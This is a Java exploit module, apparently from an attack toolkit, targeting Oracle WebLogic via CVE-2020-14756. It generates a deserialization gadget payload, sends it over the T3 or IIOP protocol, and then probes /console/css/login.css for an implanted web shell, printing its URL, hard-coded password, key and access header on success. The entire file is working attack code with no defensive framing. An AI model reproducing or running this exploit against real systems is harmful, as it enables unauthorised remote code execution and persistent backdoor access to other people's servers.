package exp.weblogic;

import core.GeneratePayload;
import exp.AttackBase;
import exp.BaseExp;
import okhttp3.Response;
import utils.Util;
import utils.weblogic.IIOPProtocolOperation;
import utils.weblogic.T3ProtocolOperation;

import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

public class Weblogic_CVE_2020_14756 extends BaseExp implements AttackBase {
    public void attack(String protocol, String stripUrl, String gadgetType, String payloadType, String trojanType)  {
        Object payload = null;
        String[] ipAndPort = Util.getIPAndPortFromBase(stripUrl);
        String host = ipAndPort[0];
        String port = ipAndPort[1];
        try {
            try {
                payload = GeneratePayload.generatePayload(gadgetType, payloadType, trojanType);
                if (protocol.equalsIgnoreCase("t3")) {
                    //T3 send
                    T3ProtocolOperation.send(protocol, host, port, Util.serialize(payload));
                } else if (protocol.equalsIgnoreCase("iiop")) {
                    IIOPProtocolOperation.send(host,port, payload);
                }
            }catch (Exception e){}
            HashMap<String, String> header = new HashMap<String, String>();
            String mime = "application/x-www-form-urlencoded";
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response = this.launch(stripUrl + "/console/css/login.css", "", mime, header);
            String bodyResult = response.body().string();
            response.close();
            if (bodyResult.contains("Success")) {
                Util.messageQueue.add(String.format("Shell_Url： %s\n", stripUrl + "/console/css/login.css"));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
            }else {
                Util.messageQueue.add("注入失败");
            }

        }catch (Exception e){
            Util.messageQueue.add(String.format("注入过程发生错误： %s", e.getMessage()));
        }
    }

    @Override
    public void run(HashMap<String, String> params) {
        String target = params.get("target");

        String payloadType = params.get("payloadType");
        String gadgetType = params.get("gadgetType");
        String trojanType = params.get("trojanType");
        String protocol = params.get("protocol");
        String stripUrl = this.getStripUrl(target);
        this.attack(protocol, stripUrl, gadgetType, payloadType, trojanType);

    }
}
